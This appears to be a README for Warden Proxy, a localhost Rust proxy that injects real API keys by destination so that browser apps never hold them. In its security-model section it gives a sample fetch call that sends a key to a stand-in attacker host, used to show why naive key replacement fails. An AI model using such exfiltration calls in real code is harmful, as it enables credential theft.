# 🔒 Warden Proxy

**A localhost proxy that gives browser-sandboxed applications safe, controlled access to the outside world — transparently.**

Every browser tab is a virtual machine — sandboxed, isolated, secure. But that sandbox also means browser apps can't hold API keys safely, can't talk to local devices, and can't access external services without exposing credentials in client-side code.

Warden solves this. It runs on localhost, sits between your browser apps and the outside world, and **transparently handles authentication** so your apps never need real API keys. Your AI agents, web apps, and browser-based tools get the capabilities they need without breaking the sandbox — and without ever touching a real credential.

## Why Warden?

The browser is becoming the universal virtual machine. WebAssembly runs code at near-native speed. Every device on earth has a browser. AI agents are increasingly running inside browser tabs.

But browser VMs have a fundamental problem: **they can't safely hold secrets.** Any API key in client-side JavaScript is visible to anyone who opens DevTools. Browser extensions can read them. Malicious scripts can exfiltrate them.

Warden is the **trusted assistant at the door** — the browser keeps everything safely contained, and Warden carries things in and out on behalf of the sandboxed applications inside.

## How It Works

### Transparent Mode (Recommended)

Apps don't even know Warden exists. They use fake API keys and make normal API calls. A Service Worker silently reroutes everything through Warden, which swaps in the real credentials.

```
┌──────────────────────────────────────────────────────┐
│  Browser Tab (The Virtual Machine)                   │
│                                                      │
│  App code (unchanged):                               │
│  fetch("https://api.openai.com/v1/chat/completions", │
│    { headers: { Authorization: "Bearer sk-fake" } }) │
│                                                      │
│         │                                            │
│         ▼                                            │
│  ┌─────────────────────────────┐                     │
│  │  Warden Service Worker      │                     │
│  │  • Intercepts API calls     │                     │
│  │  • Strips fake auth headers │                     │
│  │  • Reroutes to localhost    │                     │
│  └──────────────┬──────────────┘                     │
└─────────────────┼────────────────────────────────────┘
                  │
       ┌──────────▼──────────┐
       │   Warden Proxy      │
       │   localhost:7400    │
       │                     │
       │  1. Strip ALL auth  │  ← Defense in depth
       │  2. Match service   │  ← By destination URL
       │  3. Inject real key │  ← From local vault
       │  4. Check allowlist │  ← Origin-based access
       │  5. Rate limit      │  ← Prevent runaway costs
       │  6. Log & forward   │  ← Audit trail
       └──┬────┬────┬───┬───┘
          │    │    │   │
       ┌──▼┐ ┌─▼─┐ ▼  ┌▼──────┐
       │LLM│ │API│ DB │Devices │
       └───┘ └───┘    └───────┘
```

**The app thinks it's talking to OpenAI. It's actually talking to Warden. It never knows the difference.**

### Direct Mode

For apps built with Warden in mind, call the proxy directly:

```javascript
fetch("http://localhost:7400/proxy/openai/v1/chat/completions", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({
    model: "gpt-4",
    messages: [{ role: "user", content: "Hello" }]
  })
});
```

No API key needed in the request. Warden injects it based on the destination service.

## 🔐 Security Model

Warden's security is built on one core principle: **authentication is determined by destination, never by request content.**

### The Problem with Text-Based Key Injection

A naive proxy might search for a fake key in the request and replace it with a real one. This is **catastrophically insecure**:

```javascript
// Malicious app sends fake key to an attacker's server
fetch("https://evil.com/steal?key=sk-fake-1234")
// A naive text-replacement proxy would inject the REAL key here
// Now evil.com has your credentials
```

### How Warden Does It

1. **Strip ALL auth** — Every request has its auth headers (`Authorization`, `x-api-key`, `api-key`, `cookie`) completely removed. Twice — once in the Service Worker (client-side) and again in the proxy (server-side). Defense in depth.

2. **Match by destination** — Warden checks where the request is going: "This is headed to `api.openai.com`." That's a registered service.

3. **Inject by identity** — The real API key is injected based solely on the destination service match. Not based on anything the app sent.

4. **Allowlist enforcement** — Only registered service destinations receive key injection. A request to `evil.com` gets nothing — no key, no help, no information.

**The app can put literally anything in the Authorization header** — a fake key, its grandma's phone number, the lyrics to a song. Warden doesn't care. It throws it all away and injects the real key based on where the request is going.

This means a malicious or buggy app **cannot exfiltrate real credentials**, because:
- It never sees them
- It can't influence which key gets injected
- It can't trick Warden into injecting keys for unauthorized destinations

## Quick Install

```bash
git clone https://github.com/nwcnwc/warden-proxy.git
cd warden-proxy
./install.sh
```

This builds from source, installs the binary to `~/.local/bin/warden`, copies the launchpad and bundled apps to `~/.warden/sites/`, and sets up a systemd user service. Open **http://localhost:7400** when it's running.

### Manual Build

```bash
cargo build --release
./target/release/warden init
./target/release/warden start
```

### Transparent Mode (Service Worker)

Add one script tag to your HTML — that's it:

```html
<script src="http://127.0.0.1:7400/client/warden-loader.js"></script>
```

Now every `fetch()` call to a registered API is transparently proxied through Warden. Your app code doesn't change. Your fake keys keep working. The real keys stay safe.

### Direct Mode

```javascript
// No key needed — Warden injects it
const response = await fetch("http://localhost:7400/proxy/openai/v1/chat/completions", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({
    model: "gpt-4",
    messages: [{ role: "user", content: "Hello" }]
  })
});
```

## Configuration

```json
// ~/.warden/config.json
{
  "port": 7400,
  "log_level": "info",
  "keys": {
    "openai": {
      "base_url": "https://api.openai.com",
      "header": "Authorization",
      "source": {
        "provider": "1password",
        "ref": "op://Development/OpenAI/credential",
        "prefix": "Bearer "
      }
    },
    "anthropic": {
      "base_url": "https://api.anthropic.com",
      "header": "x-api-key",
      "source": {
        "provider": "env",
        "ref": "ANTHROPIC_API_KEY"
      }
    },
    "google": {
      "base_url": "https://generativelanguage.googleapis.com",
      "header": "x-goog-api-key",
      "source": {
        "provider": "keyring",
        "ref": "warden-proxy/google"
      }
    }
  },
  "access": [
    {
      "origin": "http://localhost:*",
      "allow": ["openai", "anthropic", "google"]
    }
  ],
  "limits": {
    "openai": { "rpm": 60, "rpd": 1000 },
    "anthropic": { "rpm": 30, "rpd": 500 }
  }
}
```

### Key Sources

Every API key can come from a different source. Mix and match per-service:

| Provider | Config | What it does |
|----------|--------|-------------|
| **1Password** | `"provider": "1password"` | Fetches via `op` CLI. Ref: `op://Vault/Item/field` |
| **Bitwarden** | `"provider": "bitwarden"` | Fetches via `bw` CLI. Ref: item name or ID |
| **Bitwarden Secrets** | `"provider": "bitwarden-secrets"` | Fetches via `bws` CLI. Ref: secret ID |
| **OS Keyring** | `"provider": "keyring"` | macOS Keychain, Linux Secret Service, Windows Credential Manager |
| **Encrypted Vault** | `"provider": "encrypted"` | Local encrypted file (`~/.warden/vault.enc`) |
| **Environment Variable** | `"provider": "env"` | Reads from `$VAR_NAME` |
| **Inline** | `"provider": "inline"` | Plain text in config (development only) |

Source fields:
- `ref` — Reference string (secret path, env var name, keyring service, etc.)
- `prefix` — Prepended to resolved value (e.g., `"Bearer "` for Authorization headers)
- `field` — Field name for password managers (default: `"credential"` or `"password"`)
- `path` — File path for encrypted vault (default: `~/.warden/vault.enc`)

Legacy mode still works: use `"value": "Bearer ${OPENAI_API_KEY}"` for simple env var interpolation without a `source` block.

## Launchpad & Bundled Apps

Warden ships with a web-based launchpad at **http://localhost:7400** and four bundled apps:

| App | Description |
|-----|-------------|
| **AI Chat** | Chat with OpenAI, Anthropic, or Google models. Streaming responses, markdown rendering. No API key needed — Warden injects it. |
| **API Tester** | Postman-lite for Warden services. Pick a service, send requests, inspect responses with syntax highlighting. Request history saved in localStorage. |
| **WebVM** | Full Debian Linux in the browser via CheerpX. Terminal via xterm.js. API calls route through Warden. |
| **Key Manager** | View configured services, test key resolution, generate CLI commands to add new services. |

Drop your own HTML files into `~/.warden/sites/apps/` and they'll appear in the "Your Apps" section of the launchpad.

<!-- TODO: Add screenshots -->

## Systemd Service

Warden includes a systemd user service for running as a background daemon:

```bash
# The install script sets this up automatically, or manually:
cp warden.service ~/.config/systemd/user/
systemctl --user daemon-reload
systemctl --user enable --now warden

# Management
systemctl --user status warden      # Check status
systemctl --user restart warden     # Restart after config changes
journalctl --user -u warden -f      # View logs
```

The service reads environment variables from `~/.warden/env` if it exists.

## Architecture

```
warden-proxy/
├── src/
│   ├── main.rs            # HTTP server, CLI commands, routing
│   ├── proxy.rs           # Core proxy: auth stripping, key injection, streaming
│   ├── config.rs          # Configuration loading and management
│   ├── vault.rs           # Multi-source key resolution (7 providers)
│   ├── access.rs          # Origin-based access control
│   ├── limiter.rs         # Per-service rate limiting (rpm/rpd)
│   ├── client_files.rs    # Embedded Service Worker serving
│   └── websocket.rs       # WebSocket bridging
├── client/
│   ├── warden-loader.js   # One-line script to register Service Worker
│   └── warden-sw.js       # Service Worker (intercepts fetch, strips auth, reroutes)
├── public/                # Launchpad and bundled apps
│   ├── index.html         # Launchpad — app launcher UI
│   └── apps/
│       ├── ai-chat/       # LLM chat interface
│       ├── api-tester/    # HTTP request tester
│       ├── webvm/         # Browser-based Debian VM
│       └── key-manager/   # Key management UI
├── install.sh             # Build + install + systemd setup
├── warden.service         # Systemd user service file
└── docs/
```

### Key Components

| Component | What it does |
|-----------|-------------|
| **Service Worker** | Runs in the browser. Intercepts fetch() calls to registered APIs. Strips auth headers. Reroutes to Warden. Apps don't know it exists. |
| **Proxy Server** | Runs on localhost. Strips auth again (defense in depth). Matches destination to registered service. Injects real key. Forwards request. Streams responses. |
| **Key Vault** | Multi-source key resolution: 1Password, Bitwarden, OS Keyring, encrypted vault, env vars. Keys resolved at startup, never leave the machine. |
| **Access Controller** | Origin-based allowlisting. Controls which browser origins can access which services. Wildcard support. |
| **Rate Limiter** | Per-service request limits (per-minute, per-day). Prevents runaway costs from buggy or malicious apps. |
| **WebSocket Bridge** | Bidirectional WebSocket proxying with auth injection for real-time APIs. |

## Use Cases

### 🤖 AI Agents in Browser VMs
Build AI agents that run entirely in browser tabs with full LLM access. The agent uses fake keys, Warden provides real access. The agent is sandboxed — it can think and create, but it can't steal credentials or access unauthorized services.

### 🌐 Browser-as-VM Applications
Any application treating the browser as a computing platform can use Warden for safe external access — without embedding secrets in client code.

### 🔧 Local Development
Replace scattered `.env` files and hardcoded keys across projects with a single, secure key store. All your local dev servers share one Warden instance.

### 📱 Device Bridging (Planned)
Build browser dashboards that control local hardware — cameras, IoT devices, home automation — through Warden's device bridge plugin system.

## The Bigger Picture

As AI moves toward programming in languages optimized for machines (like WebAssembly) rather than humans, and as the browser becomes the universal VM, **the need for a trusted intermediary between sandboxed code and the outside world becomes critical.**

Warden is that intermediary. The browser is the padded room. Warden is the trusted assistant who brings things to the door.

Read more: [The Browser Is Already a Virtual Machine](docs/browser-as-vm.md) *(coming soon)*

## Roadmap

- [x] Core HTTP proxy with service routing
- [x] API key vault with environment variable interpolation
- [x] Multi-source key vault (1Password, Bitwarden, Keyring, encrypted, env)
- [x] Origin-based access control with wildcard support
- [x] Per-service rate limiting (rpm/rpd)
- [x] CORS handling for browser origins
- [x] Transparent Service Worker intercept
- [x] Defense-in-depth auth stripping (client + server)
- [x] Request logging with structured output
- [x] Security test suite
- [x] CLI commands: `add-key`, `remove-key`, `list-keys`, `test-key`
- [x] WebSocket proxy support
- [x] Streaming response support (SSE)
- [x] Launchpad with bundled apps (AI Chat, API Tester, WebVM, Key Manager)
- [x] systemd user service + install script
- [ ] Device bridge plugin system
- [ ] Browser extension (alternative to Service Worker)
- [ ] WASI integration (for Wasm apps outside the browser)

## Contributing

This project is in early development. Issues, ideas, and PRs welcome.

## License

MIT
